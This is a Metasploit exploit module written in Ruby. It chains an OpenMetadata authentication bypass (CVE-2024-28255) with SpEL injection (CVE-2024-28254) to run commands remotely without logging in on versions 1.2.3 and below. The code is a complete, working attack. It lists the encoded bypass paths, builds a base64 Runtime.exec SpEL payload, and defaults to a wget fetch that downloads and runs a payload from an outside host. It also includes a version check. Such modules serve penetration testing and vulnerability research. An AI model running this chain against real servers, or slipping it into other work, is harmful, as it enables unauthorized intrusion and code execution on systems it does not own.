##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenMetadata authentication bypass and SpEL injection exploit chain',
        'Description' => %q{
          OpenMetadata is a unified platform for discovery, observability, and governance powered
          by a central metadata repository, in-depth lineage, and seamless team collaboration.
          This module chains two vulnerabilities that exist in the OpenMetadata aplication.
          The first vulnerability, CVE-2024-28255, bypasses the API authentication using JWT tokens.
          It misuses the `JwtFilter` that checks the path of the url endpoint against a list of excluded
          endpoints that does not require authentication. Unfortunately, an attacker may use Path Parameters
          to make any path contain any arbitrary strings that will match the excluded endpoint condition
          and therefore will be processed with no JWT validation allowing an attacker to bypass the
          authentication mechanism and reach any arbitrary endpoint.
          By chaining this vulnerability with CVE-2024-28254, that allows for arbitrary SpEL injection
          at endpoint `/api/v1/events/subscriptions/validation/condition/<expression>`, attackers
          are able to run arbitrary commands using Java classes such as `java.lang.Runtime` without any
          authentication.
          OpenMetadata versions `1.2.3` and below are vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Msf module contributor
          'Alvaro Muñoz alias pwntester (https://github.com/pwntester)' # Original discovery
        ],
        'References' => [
          ['CVE', '2024-28255'],
          ['CVE', '2024-28254'],
          ['URL', 'https://securitylab.github.com/advisories/GHSL-2023-235_GHSL-2023-237_Open_Metadata/'],
          ['URL', 'https://attackerkb.com/topics/f19fXpZn62/cve-2024-28255'],
          ['URL', 'https://ethicalhacking.uk/unmasking-cve-2024-28255-authentication-bypass-in-openmetadata/']
        ],
        'DisclosureDate' => '2024-03-15',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Automatic',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'rport' => 8585,
          'FETCH_COMMAND' => 'WGET'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path of the OpenMetadata web application', '/'])
      ]
    )
  end

  def execute_command(cmd, _opts = {})
    # list of paths that require no authentication
    unauthed_paths = [
      '/api/v1;v1%2Fv1%2Fusers%2Flogin',
      '/api/v1;v1%2Fv1%2Fusers%2Fsignup',
      '/api/v1;v1%2Fv1%2Fusers%2FregistrationConfirmation',
      '/api/v1;v1%2Fv1%2Fusers%2FresendRegistrationToken',
      '/api/v1;v1%2Fv1%2Fusers%2FgeneratePasswordResetLink',
      '/api/v1;v1%2Fv1%2Fusers%2Fpassword%2Freset',
      '/api/v1;v1%2Fv1%2Fusers%2FcheckEmailInUse',
      '/api/v1;v1%2Fv1%2Fusers%2Frefresh',
      '/api/v1;v1%2Fv1%2Fsystem%2Fconfig',
      '/api/v1;v1%2Fv1%2Fsystem%2Fversion'
    ]
    # $@|sh – Getting a shell environment from Runtime.exec
    cmd = "sh -c $@|sh . echo #{cmd}"
    cmd_b64 = Base64.strict_encode64(cmd)
    spel_payload = "T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(\"#{cmd_b64}\")))"
    unauthed_paths.shuffle!.each do |path|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, path, 'events', 'subscriptions', 'validation', 'condition', spel_payload),
        'method' => 'GET'
      })
      break if res.code == 400 && res.body.include?('EL1001E')
    end
  end

  def check
    print_status('Trying to detect if target is running a vulnerable version of OpenMetadata.')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    })
    return CheckCode::Unknown('Could not detect OpenMetadata.') unless res && res.code == 200 && res.body.include?('OpenMetadata')

    # try to dectect version
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'system', 'version'),
      'method' => 'GET'
    })
    return CheckCode::Detected('Could not retrieve the version information.') unless res && res.code == 200

    # parse json response and get the version
    res_json = res.get_json_document
    unless res_json.blank?
      version = res_json['version']
      version_number = Rex::Version.new(version.gsub(/[[:space:]]/, '')) unless version.nil?
    end
    return CheckCode::Detected('Could not retrieve the version information.') if version_number.nil?
    return CheckCode::Appears("Version #{version_number}") if version_number <= Rex::Version.new('1.2.3')

    CheckCode::Safe("Version #{version_number}")
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    execute_command(payload.encoded)
  end
end
